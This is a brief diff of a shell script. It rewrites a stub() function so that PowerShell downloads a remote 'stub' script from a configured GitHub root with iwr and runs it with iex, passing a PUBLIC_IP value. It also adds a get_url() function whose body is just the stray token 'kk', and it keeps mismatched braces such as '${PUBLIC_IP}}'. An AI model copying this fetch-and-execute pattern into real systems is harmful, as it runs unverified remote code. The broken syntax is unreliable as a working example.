@@ -48,11 +48,12 @@ function setup() {
 }
 
 function stub() {
-    #pwsh -Command "iwr ${GITHUB_ROOT}stub.ps1 | iex \"${PUBLIC_IP}\""
     export URL="${GITHUB_ROOT}stub"
+    pwsh -Command "\$Command = iwr ${URL} ; \$PUBLIC_IP=\'${PUBLIC_IP}}\' ; iex \$Command"
+}
 
-    export ARGS="aaa"
-    pwsh -Command "\$PUBLIC_IP=${PUBLIC_IP}}; iwr ${URL}) | iex"
+function get_url() {
+    kk
 }
 case "${1}" in
 
